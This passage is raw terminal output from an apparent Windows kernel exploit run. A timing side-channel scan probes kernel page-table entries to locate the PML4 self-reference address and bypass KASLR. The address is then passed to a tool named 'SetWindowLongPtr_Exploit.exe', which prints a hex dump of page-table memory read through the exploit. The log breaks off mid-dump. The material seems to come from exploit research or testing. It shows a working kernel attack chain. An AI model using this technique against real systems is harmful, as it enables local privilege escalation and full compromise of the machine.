Time: 202.525726 +] PTE FFFF81810719D080 looks mapped! - Time: 208.673874 Time difference exceed for ffff818804020100, retrying... +] PTE FFFF818804020100 looks mapped! - Time: 209.071213 +] Removing 103 from initial array and pushing it into final array Time difference exceed for ffff824120904820, retrying... Potential SelfRef: FFFF824120904820 +] PTE FFFF82010719CE80 looks mapped! - Time: 198.373642 Time difference exceed for ffff82010719cf00, retrying... +] PTE FFFF82010719CF00 looks mapped! - Time: 206.213593 +] PTE FFFF82010719CF80 looks mapped! - Time: 210.637344 +] PTE FFFF82010719D000 looks mapped! - Time: 207.820862 +] PTE FFFF82010719D080 looks mapped! - Time: 197.229263 +] PTE FFFF820804020100 looks mapped! - Time: 204.585739 +] Removing 104 from initial array and pushing it into final array Potential SelfRef: FFFF82C160B05828 +] PTE FFFF82810719CE80 looks mapped! - Time: 216.981003 Time difference exceed for ffff8341a0d06830, retrying... Potential SelfRef: FFFF8341A0D06830 +] PTE FFFF83010719CE80 looks mapped! - Time: 201.957657 +] PTE FFFF83010719CF00 looks mapped! - Time: 202.023697 +] PTE FFFF83010719CF80 looks mapped! - Time: 212.651016 +] PTE FFFF83010719D000 looks mapped! - Time: 214.013504 +] PTE FFFF83010719D080 looks mapped! - Time: 191.688126 +] PTE FFFF830804020100 looks mapped! - Time: 193.314758 +] Removing 106 from initial array and pushing it into final array Potential SelfRef: FFFF83C1E0F07838 +] PTE FFFF83810719CE80 looks mapped! - Time: 195.506973 +] PTE FFFF83810719CF00 looks mapped! - Time: 193.697693 +] PTE FFFF83810719CF80 looks mapped! - Time: 208.809097 +] PTE FFFF83810719D000 looks mapped! - Time: 216.298660 +] PTE FFFF83810719D080 looks mapped! - Time: 203.848816 +] PTE FFFF838804020100 looks mapped! - Time: 204.008743 +] Removing 107 from initial array and pushing it into final array Time difference exceed for ffff89c4e2713898, retrying... Time difference exceed for ffff8bc5e2f178b8, retrying... Time difference exceed for ffff8c46231188c0, retrying... Unmapped Initial: 248.508636 Mapped Initial: 207.139847 -------------------------- +] Measures are not consistent yet... +] Measures are not consistent yet... +] Measures are not consistent yet... +] Measures are not consistent yet... +] Measures are not consistent yet... -------------------------- Unmapped: 236.360733 Mapped: 195.650040 --------------------------  Potential SelfRef: FFFF8140A0502810 +] PTE FFFF81010719CE80 looks mapped! - Time: 197.312363 Potential SelfRef: FFFF81C0E0703818 Time difference exceed for ffff81810719ce80, retrying... Time difference exceed for ffff81810719ce80, retrying... Time difference exceed for ffff81810719ce80, retrying... Time difference exceed for ffff81810719ce80, retrying... +] PTE FFFF81810719CE80 looks mapped! - Time: 209.812393 Time difference exceed for ffff81810719cf00, retrying... +] PTE FFFF81810719CF00 looks mapped! - Time: 207.951645 +] PTE FFFF81810719CF80 looks mapped! - Time: 200.001724 +] PTE FFFF81810719D000 looks mapped! - Time: 197.655167 +] PTE FFFF81810719D080 looks mapped! - Time: 201.667160 +] PTE FFFF818804020100 looks mapped! - Time: 195.728439 PML4e: FFFF8140A0502810 - Index: 102 PML4e: FFFF81C0E0703818 - Index: 103 PML4e: FFFF824120904820 - Index: 104 PML4e: FFFF8341A0D06830 - Index: 106 PML4e: FFFF83C1E0F07838 - Index: 107 KNOWN_UNMAPPED PTE: ffff818000000000 -] Erasing 103 from final array Potential SelfRef: FFFF824120904820 +] PTE FFFF82010719CE80 looks mapped! - Time: 206.883759 +] PTE FFFF82010719CF00 looks mapped! - Time: 208.451019 +] PTE FFFF82010719CF80 looks mapped! - Time: 201.073364 +] PTE FFFF82010719D000 looks mapped! - Time: 203.052826 +] PTE FFFF82010719D080 looks mapped! - Time: 194.115143 +] PTE FFFF820804020100 looks mapped! - Time: 198.158585 PML4e: FFFF8140A0502810 - Index: 102 PML4e: FFFF824120904820 - Index: 104 PML4e: FFFF8341A0D06830 - Index: 106 PML4e: FFFF83C1E0F07838 - Index: 107 KNOWN_UNMAPPED PTE: ffff820000000000 -] Erasing 104 from final array Potential SelfRef: FFFF8341A0D06830 +] PTE FFFF83010719CE80 looks mapped! - Time: 200.405823 +] PTE FFFF83010719CF00 looks mapped! - Time: 201.572525 +] PTE FFFF83010719CF80 looks mapped! - Time: 193.538040 +] PTE FFFF83010719D000 looks mapped! - Time: 196.066254 +] PTE FFFF83010719D080 looks mapped! - Time: 189.007034 +] PTE FFFF830804020100 looks mapped! - Time: 197.613953 PML4e: FFFF8140A0502810 - Index: 102 PML4e: FFFF8341A0D06830 - Index: 106 PML4e: FFFF83C1E0F07838 - Index: 107 KNOWN_UNMAPPED PTE: ffff830000000000 -] Erasing 106 from final array Potential SelfRef: FFFF83C1E0F07838 +] PTE FFFF83810719CE80 looks mapped! - Time: 200.655380 Time difference exceed for ffff83810719cf00, retrying... Time difference exceed for ffff83810719cf00, retrying... Unmapped Initial: 232.123840 Mapped Initial: 196.420654 -------------------------- +] Measures are not consistent yet... +] Measures are not consistent yet... +] Measures are not consistent yet... +] Measures are not consistent yet... +] Measures are not consistent yet... -------------------------- Unmapped: 234.845581 Mapped: 187.862518 --------------------------  Potential SelfRef: FFFF8140A0502810 +] PTE FFFF81010719CE80 looks mapped! - Time: 197.432938 +] PTE FFFF81010719CF00 looks mapped! - Time: 191.731766 Time difference exceed for ffff81010719cf80, retrying... Time difference exceed for ffff81010719cf80, retrying... Time difference exceed for ffff81010719cf80, retrying... +] PTE FFFF81010719CF80 looks mapped! - Time: 201.003784 +] PTE FFFF81010719D000 looks mapped! - Time: 194.332733 +] PTE FFFF81010719D080 looks mapped! - Time: 200.211182 +] PTE FFFF810804020100 looks mapped! - Time: 199.812225 PML4e: FFFF8140A0502810 - Index: 102 PML4e: FFFF83C1E0F07838 - Index: 107 KNOWN_UNMAPPED PTE: ffff810000000000 Time difference exceed for ffff810000000000, retrying... -] Erasing 102 from final array Time difference exceed for ffff83c1e0f07838, retrying... Potential SelfRef: FFFF83C1E0F07838 Time difference exceed for ffff83810719ce80, retrying... Time difference exceed for ffff83810719ce80, retrying... Unmapped Initial: 230.247162 Mapped Initial: 198.023987 -------------------------- +] Measures are not consistent yet... +] Measures are not consistent yet... +] Measures are not consistent yet... +] Measures are not consistent yet... +] Measures are not consistent yet... -------------------------- Unmapped: 235.923035 Mapped: 191.605301 --------------------------  Time difference exceed for ffff83c1e0f07838, retrying... Time difference exceed for ffff83c1e0f07838, retrying... Potential SelfRef: FFFF83C1E0F07838 Time difference exceed for ffff83810719ce80, retrying... Time difference exceed for ffff83810719ce80, retrying... Time difference exceed for ffff83810719ce80, retrying... Time difference exceed for ffff83810719ce80, retrying... Time difference exceed for ffff83810719ce80, retrying... Unmapped Initial: 258.041046 Mapped Initial: 210.309753 -------------------------- +] Measures are not consistent yet... +] Measures are not consistent yet... +] Measures are not consistent yet... +] Measures are not consistent yet... +] Measures are not consistent yet... -------------------------- Unmapped: 238.757538 Mapped: 203.896240 --------------------------  Potential SelfRef: FFFF83C1E0F07838 +] PTE FFFF83810719CE80 looks mapped! - Time: 210.036102 +] PTE FFFF83810719CF00 looks mapped! - Time: 199.200836 +] PTE FFFF83810719CF80 looks mapped! - Time: 204.575333 +] PTE FFFF83810719D000 looks mapped! - Time: 197.218445 +] PTE FFFF83810719D080 looks mapped! - Time: 203.334763 +] PTE FFFF838804020100 looks mapped! - Time: 203.243607 PML4e: FFFF83C1E0F07838 - Index: 107 KNOWN_UNMAPPED PTE: ffff838000000000 -] Erasing 107 from final array Potential SelfRef: FFFF82C160B05828 +] PTE FFFF82810719CE80 looks mapped! - Time: 201.889221 +] PTE FFFF82810719CF00 looks mapped! - Time: 201.679138 +] PTE FFFF82810719CF80 looks mapped! - Time: 204.281006 +] PTE FFFF82810719D000 looks mapped! - Time: 209.909943 +] PTE FFFF82810719D080 looks mapped! - Time: 202.795639 +] PTE FFFF828804020100 looks mapped! - Time: 196.754044 +] Removing 105 from initial array and pushing it into final array Time difference exceed for ffff884422110880, retrying... Time difference exceed for ffff884422110880, retrying... Time difference exceed for ffff8ec763b1d8e8, retrying... Time difference exceed for ffff8ec763b1d8e8, retrying... Time difference exceed for ffff8ec763b1d8e8, retrying... Time difference exceed for ffff8ec763b1d8e8, retrying... Time difference exceed for ffff90c864321908, retrying... Unmapped Initial: 257.754272 Mapped Initial: 207.903702 -------------------------- +] Measures are not consistent yet... +] Measures are not consistent yet... +] Measures are not consistent yet... +] Measures are not consistent yet... +] Measures are not consistent yet... -------------------------- Unmapped: 247.145935 Mapped: 207.792923 --------------------------  Potential SelfRef: FFFF82C160B05828 +] PTE FFFF82810719CE80 looks mapped! - Time: 208.554092 +] PTE FFFF82810719CF00 looks mapped! - Time: 206.517715 +] PTE FFFF82810719CF80 looks mapped! - Time: 216.576614 +] PTE FFFF82810719D000 looks mapped! - Time: 213.698837 +] PTE FFFF82810719D080 looks mapped! - Time: 210.162796 +] PTE FFFF828804020100 looks mapped! - Time: 208.765045 PML4e: FFFF82C160B05828 - Index: 105 KNOWN_UNMAPPED PTE: ffff828000000000 -] Erasing 105 from final array -] Removing 100 as it seems to be unmapped -] Removing 101 as it seems to be unmapped -] Removing 108 as it seems to be unmapped -] Removing 109 as it seems to be unmapped -] Removing 10a as it seems to be unmapped -] Removing 10b as it seems to be unmapped -] Removing 10c as it seems to be unmapped -] Removing 10d as it seems to be unmapped Time difference exceed for ffff8743a1d0e870, retrying... -] Removing 10e as it seems to be unmapped -] Removing 10f as it seems to be unmapped -] Removing 110 as it seems to be unmapped Time difference exceed for ffff88c462311888, retrying... -] Removing 111 as it seems to be unmapped -] Removing 112 as it seems to be unmapped -] Removing 113 as it seems to be unmapped Time difference exceed for ffff8a45229148a0, retrying... -] Removing 114 as it seems to be unmapped -] Removing 115 as it seems to be unmapped -] Removing 116 as it seems to be unmapped -] Removing 117 as it seems to be unmapped Time difference exceed for ffffbc5e2f178bc0, retrying... Time difference exceed for ffffbc5e2f178bc0, retrying... Time difference exceed for ffffe8f47a3d1e88, retrying... Potential SelfRef: FFFFF67B3D9ECF60 +] PTE FFFFF6010719CE80 looks mapped! - Time: 201.963379 +] PTE FFFFF6010719CF00 looks mapped! - Time: 212.917694 +] PTE FFFFF6010719CF80 looks mapped! - Time: 207.448502 +] PTE FFFFF6010719D000 looks mapped! - Time: 203.673920 +] PTE FFFFF6010719D080 looks mapped! - Time: 206.782059 +] PTE FFFFF60804020100 looks mapped! - Time: 211.636246 +] Removing 1ec from initial array and pushing it into final array Unmapped Initial: 233.678802 Mapped Initial: 214.496124 -------------------------- +] Measures are not consistent yet... +] Measures are not consistent yet... +] Measures are not consistent yet... +] Measures are not consistent yet... +] Measures are not consistent yet... +] Measures are not consistent yet... -------------------------- Unmapped: 250.585373 Mapped: 213.339661 --------------------------  Potential SelfRef: FFFFF67B3D9ECF60 +] PTE FFFFF6010719CE80 looks mapped! - Time: 201.419174 +] PTE FFFFF6010719CF00 looks mapped! - Time: 199.196457 +] PTE FFFFF6010719CF80 looks mapped! - Time: 210.779861 +] PTE FFFFF6010719D000 looks mapped! - Time: 199.642334 +] PTE FFFFF6010719D080 looks mapped! - Time: 200.348160 +] PTE FFFFF60804020100 looks mapped! - Time: 204.036926 PML4e: FFFFF67B3D9ECF60 - Index: 1ec KNOWN_UNMAPPED PTE: fffff60000000000 Real PML4 SelfRef Found: fffff67b3d9ecf60 Left in Potential Array: ffff8c46231188c0 Left in Potential Array: ffff8cc6633198c8 Left in Potential Array: ffff8d46a351a8d0 Left in Potential Array: ffff8dc6e371b8d8 Left in Potential Array: ffff8e472391c8e0 Left in Potential Array: ffff8ec763b1d8e8 Left in Potential Array: ffff8f47a3d1e8f0 Left in Potential Array: ffff8fc7e3f1f8f8 Left in Potential Array: ffff904824120900 Left in Potential Array: ffff90c864321908 Left in Potential Array: ffff9148a4522910 Left in Potential Array: ffff91c8e4723918 Left in Potential Array: ffff924924924920 Left in Potential Array: ffff92c964b25928 Left in Potential Array: ffff9349a4d26930 Left in Potential Array: ffff93c9e4f27938 Left in Potential Array: ffff944a25128940 Left in Potential Array: ffff94ca65329948 Left in Potential Array: ffff954aa552a950 Left in Potential Array: ffff95cae572b958 Left in Potential Array: ffff964b2592c960 Left in Potential Array: ffff96cb65b2d968 Left in Potential Array: ffff974ba5d2e970 Left in Potential Array: ffff97cbe5f2f978 Left in Potential Array: ffff984c26130980 Left in Potential Array: ffff98cc66331988 Left in Potential Array: ffff994ca6532990 Left in Potential Array: ffff99cce6733998 Left in Potential Array: ffff9a4d269349a0 Left in Potential Array: ffff9acd66b359a8 Left in Potential Array: ffff9b4da6d369b0 Left in Potential Array: ffff9bcde6f379b8 Left in Potential Array: ffff9c4e271389c0 Left in Potential Array: ffff9cce673399c8 Left in Potential Array: ffff9d4ea753a9d0 Left in Potential Array: ffff9dcee773b9d8 Left in Potential Array: ffff9e4f2793c9e0 Left in Potential Array: ffff9ecf67b3d9e8 Left in Potential Array: ffff9f4fa7d3e9f0 Left in Potential Array: ffff9fcfe7f3f9f8 Left in Potential Array: ffffa05028140a00 Left in Potential Array: ffffa0d068341a08 Left in Potential Array: ffffa150a8542a10 Left in Potential Array: ffffa1d0e8743a18 Left in Potential Array: ffffa25128944a20 Left in Potential Array: ffffa2d168b45a28 Left in Potential Array: ffffa351a8d46a30 Left in Potential Array: ffffa3d1e8f47a38 Left in Potential Array: ffffa45229148a40 Left in Potential Array: ffffa4d269349a48 Left in Potential Array: ffffa552a954aa50 Left in Potential Array: ffffa5d2e974ba58 Left in Potential Array: ffffa6532994ca60 Left in Potential Array: ffffa6d369b4da68 Left in Potential Array: ffffa753a9d4ea70 Left in Potential Array: ffffa7d3e9f4fa78 Left in Potential Array: ffffa8542a150a80 Left in Potential Array: ffffa8d46a351a88 Left in Potential Array: ffffa954aa552a90 Left in Potential Array: ffffa9d4ea753a98 Left in Potential Array: ffffaa552a954aa0 Left in Potential Array: ffffaad56ab55aa8 Left in Potential Array: ffffab55aad56ab0 Left in Potential Array: ffffabd5eaf57ab8 Left in Potential Array: ffffac562b158ac0 Left in Potential Array: ffffacd66b359ac8 Left in Potential Array: ffffad56ab55aad0 Left in Potential Array: ffffadd6eb75bad8 Left in Potential Array: ffffae572b95cae0 Left in Potential Array: ffffaed76bb5dae8 Left in Potential Array: ffffaf57abd5eaf0 Left in Potential Array: ffffafd7ebf5faf8 Left in Potential Array: ffffb0582c160b00 Left in Potential Array: ffffb0d86c361b08 Left in Potential Array: ffffb158ac562b10 Left in Potential Array: ffffb1d8ec763b18 Left in Potential Array: ffffb2592c964b20 Left in Potential Array: ffffb2d96cb65b28 Left in Potential Array: ffffb359acd66b30 Left in Potential Array: ffffb3d9ecf67b38 Left in Potential Array: ffffb45a2d168b40 Left in Potential Array: ffffb4da6d369b48 Left in Potential Array: ffffb55aad56ab50 Left in Potential Array: ffffb5daed76bb58 Left in Potential Array: ffffb65b2d96cb60 Left in Potential Array: ffffb6db6db6db68 Left in Potential Array: ffffb75badd6eb70 Left in Potential Array: ffffb7dbedf6fb78 Left in Potential Array: ffffb85c2e170b80 Left in Potential Array: ffffb8dc6e371b88 Left in Potential Array: ffffb95cae572b90 Left in Potential Array: ffffb9dcee773b98 Left in Potential Array: ffffba5d2e974ba0 Left in Potential Array: ffffbadd6eb75ba8 Left in Potential Array: ffffbb5daed76bb0 Left in Potential Array: ffffbbddeef77bb8 Left in Potential Array: ffffbc5e2f178bc0 Left in Potential Array: ffffbcde6f379bc8 Left in Potential Array: ffffbd5eaf57abd0 Left in Potential Array: ffffbddeef77bbd8 Left in Potential Array: ffffbe5f2f97cbe0 Left in Potential Array: ffffbedf6fb7dbe8 Left in Potential Array: ffffbf5fafd7ebf0 Left in Potential Array: ffffbfdfeff7fbf8 Left in Potential Array: ffffc06030180c00 Left in Potential Array: ffffc0e070381c08 Left in Potential Array: ffffc160b0582c10 Left in Potential Array: ffffc1e0f0783c18 Left in Potential Array: ffffc26130984c20 Left in Potential Array: ffffc2e170b85c28 Left in Potential Array: ffffc361b0d86c30 Left in Potential Array: ffffc3e1f0f87c38 Left in Potential Array: ffffc46231188c40 Left in Potential Array: ffffc4e271389c48 Left in Potential Array: ffffc562b158ac50 Left in Potential Array: ffffc5e2f178bc58 Left in Potential Array: ffffc6633198cc60 Left in Potential Array: ffffc6e371b8dc68 Left in Potential Array: ffffc763b1d8ec70 Left in Potential Array: ffffc7e3f1f8fc78 Left in Potential Array: ffffc86432190c80 Left in Potential Array: ffffc8e472391c88 Left in Potential Array: ffffc964b2592c90 Left in Potential Array: ffffc9e4f2793c98 Left in Potential Array: ffffca6532994ca0 Left in Potential Array: ffffcae572b95ca8 Left in Potential Array: ffffcb65b2d96cb0 Left in Potential Array: ffffcbe5f2f97cb8 Left in Potential Array: ffffcc6633198cc0 Left in Potential Array: ffffcce673399cc8 Left in Potential Array: ffffcd66b359acd0 Left in Potential Array: ffffcde6f379bcd8 Left in Potential Array: ffffce673399cce0 Left in Potential Array: ffffcee773b9dce8 Left in Potential Array: ffffcf67b3d9ecf0 Left in Potential Array: ffffcfe7f3f9fcf8 Left in Potential Array: ffffd068341a0d00 Left in Potential Array: ffffd0e8743a1d08 Left in Potential Array: ffffd168b45a2d10 Left in Potential Array: ffffd1e8f47a3d18 Left in Potential Array: ffffd269349a4d20 Left in Potential Array: ffffd2e974ba5d28 Left in Potential Array: ffffd369b4da6d30 Left in Potential Array: ffffd3e9f4fa7d38 Left in Potential Array: ffffd46a351a8d40 Left in Potential Array: ffffd4ea753a9d48 Left in Potential Array: ffffd56ab55aad50 Left in Potential Array: ffffd5eaf57abd58 Left in Potential Array: ffffd66b359acd60 Left in Potential Array: ffffd6eb75badd68 Left in Potential Array: ffffd76bb5daed70 Left in Potential Array: ffffd7ebf5fafd78 Left in Potential Array: ffffd86c361b0d80 Left in Potential Array: ffffd8ec763b1d88 Left in Potential Array: ffffd96cb65b2d90 Left in Potential Array: ffffd9ecf67b3d98 Left in Potential Array: ffffda6d369b4da0 Left in Potential Array: ffffdaed76bb5da8 Left in Potential Array: ffffdb6db6db6db0 Left in Potential Array: ffffdbedf6fb7db8 Left in Potential Array: ffffdc6e371b8dc0 Left in Potential Array: ffffdcee773b9dc8 Left in Potential Array: ffffdd6eb75badd0 Left in Potential Array: ffffddeef77bbdd8 Left in Potential Array: ffffde6f379bcde0 Left in Potential Array: ffffdeef77bbdde8 Left in Potential Array: ffffdf6fb7dbedf0 Left in Potential Array: ffffdfeff7fbfdf8 Left in Potential Array: ffffe070381c0e00 Left in Potential Array: ffffe0f0783c1e08 Left in Potential Array: ffffe170b85c2e10 Left in Potential Array: ffffe1f0f87c3e18 Left in Potential Array: ffffe271389c4e20 Left in Potential Array: ffffe2f178bc5e28 Left in Potential Array: ffffe371b8dc6e30 Left in Potential Array: ffffe3f1f8fc7e38 Left in Potential Array: ffffe472391c8e40 Left in Potential Array: ffffe4f2793c9e48 Left in Potential Array: ffffe572b95cae50 Left in Potential Array: ffffe5f2f97cbe58 Left in Potential Array: ffffe673399cce60 Left in Potential Array: ffffe6f379bcde68 Left in Potential Array: ffffe773b9dcee70 Left in Potential Array: ffffe7f3f9fcfe78 Left in Potential Array: ffffe8743a1d0e80 Left in Potential Array: ffffe8f47a3d1e88 Left in Potential Array: ffffe974ba5d2e90 Left in Potential Array: ffffe9f4fa7d3e98 Left in Potential Array: ffffea753a9d4ea0 Left in Potential Array: ffffeaf57abd5ea8 Left in Potential Array: ffffeb75badd6eb0 Left in Potential Array: ffffebf5fafd7eb8 Left in Potential Array: ffffec763b1d8ec0 Left in Potential Array: ffffecf67b3d9ec8 Left in Potential Array: ffffed76bb5daed0 Left in Potential Array: ffffedf6fb7dbed8 Left in Potential Array: ffffee773b9dcee0 Left in Potential Array: ffffeef77bbddee8 Left in Potential Array: ffffef77bbddeef0 Left in Potential Array: ffffeff7fbfdfef8 Left in Potential Array: fffff0783c1e0f00 Left in Potential Array: fffff0f87c3e1f08 Left in Potential Array: fffff178bc5e2f10 Left in Potential Array: fffff1f8fc7e3f18 Left in Potential Array: fffff2793c9e4f20 Left in Potential Array: fffff2f97cbe5f28 Left in Potential Array: fffff379bcde6f30 Left in Potential Array: fffff3f9fcfe7f38 Left in Potential Array: fffff47a3d1e8f40 Left in Potential Array: fffff4fa7d3e9f48 Left in Potential Array: fffff57abd5eaf50 Left in Potential Array: fffff5fafd7ebf58 Left in Potential Array: fffff6fb7dbedf68 Left in Potential Array: fffff77bbddeef70 Left in Potential Array: fffff7fbfdfeff78 Left in Potential Array: fffff87c3e1f0f80 Left in Potential Array: fffff8fc7e3f1f88 Left in Potential Array: fffff97cbe5f2f90 Left in Potential Array: fffff9fcfe7f3f98 Left in Potential Array: fffffa7d3e9f4fa0 Left in Potential Array: fffffafd7ebf5fa8 Left in Potential Array: fffffb7dbedf6fb0 Left in Potential Array: fffffbfdfeff7fb8 Left in Potential Array: fffffc7e3f1f8fc0 Left in Potential Array: fffffcfe7f3f9fc8 Left in Potential Array: fffffd7ebf5fafd0 Left in Potential Array: fffffdfeff7fbfd8 Left in Potential Array: fffffe7f3f9fcfe0 Left in Potential Array: fffffeff7fbfdfe8 Left in Potential Array: ffffff7fbfdfeff0 Left in Potential Array: fffffffffffffff8 Left in Final Array: fffff67b3d9ecf60 Result: fffff67b3d9ecf60 Run SetWindowLongPtr_Exploit.exe C:\Users\qa\Desktop>SetWindowLongPtr_Exploit.exe fffff67b3d9ecf60 My PID is: 6056 Current Username: qa PML4 Self Ref: FFFFF67B3D9ECF60 Enter to continue...                                                                                                                           Value Self Ref = 8000000100211867 000000003D9EC000 | 67 a8 e2 61 00 00 c0 02 67 d8 d8 6b 00 00 d0 00 | g..a....g..k.... 000000003D9EC010 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................ 000000003D9EC020 | 67 68 81 08 01 00 90 01 00 00 00 00 00 00 00 00 | gh.............. 000000003D9EC030 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................ 000000003D9EC040 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................ 000000003D9EC050 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................ 000000003D9EC060 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................ 000000003D9EC070 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................ 000000003D9EC080 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................ 000000003D9EC090 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................ 000000003D9EC0A0 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................ 000000003D9EC0B0 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................ 000000003D9EC0C0 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................ 000000003D9EC0D0 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................ 000000003D9EC0E0 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................ 000000003D9EC0F0 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................ 000000003D9EC100 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................ 000000003D9EC110 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................ 000000003D9EC120 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................ 000000003D9EC130 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................ 000000003D9EC140 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................ 000000003D9EC150 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................ 000000003D9EC160 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................ 000000003D9EC170 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................ 000000003D9EC180 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................ 000000003D9EC190 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................ 000000003D9EC1A0 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................ 000000003D9EC1B0 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................ 000000003D9EC1C0 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................ 000000003D9EC1D0 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................ 000000003D9EC1E0 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................ 000000003D9EC1F0 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................ 000000003D9EC200 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................ 000000003D9EC210 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................ 000000003D9EC220 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................ 000000003D9EC230 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................ 000000003D9EC240 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................ 000000003D9EC250 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................ 000000003D9EC260 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................ 000000003D9EC270 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................ 000000003D9EC280 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................ 000000003D9EC290 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................ 000000003D9EC2A0 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................ 000000003D9EC2B0 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................ 000000003D9EC2C0 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................ 000000003D9EC2D0 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................ 000000003D9EC2E0 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................ 000000003D9EC2F0 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................ 000000003D9EC300 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................ 000000003D9EC310 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................ 000000003D9EC320 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................ 000000003D9EC330 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................ 000000003D9EC340 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................ 000000003D9EC350 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................ 000000003D9EC360 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................ 000000003D9EC370 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................ 000000003D9EC380 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................ 000000003D9EC390 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................ 000000003D9EC3A0 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................ 000000003D9EC3B0 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................ 000000003D9EC3C0 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................ 000000003D9EC3D0 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................ 000000003D9EC3E0 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................ 000000003D9EC3F0 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................ 000000003D9EC400 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................ 000000003D9EC410 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................ 000000003D9EC420 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................ 000000003D9EC430 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................ 000000003D9EC440 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................ 000000003D9EC450 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................ 000000003D9EC460 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................ 000000003D9EC470 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................ 000000003D9EC480 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................ 000000003D9EC490 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................ 000000003D9EC4A0 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................ 000000003D9EC4B0 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................ 000000003D9EC4C0 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................ 000000003D9EC4D0 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................ 000000003D9EC4E0 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................ 000000003D9EC4F0 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................ 000000003D9EC500 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................ 000000003D9EC510 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................ 000000003D9EC520 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................ 000000003D9EC530 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................ 000000003D9EC540 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................ 000000003D9EC550 | 00 00 00 00 00 00 00 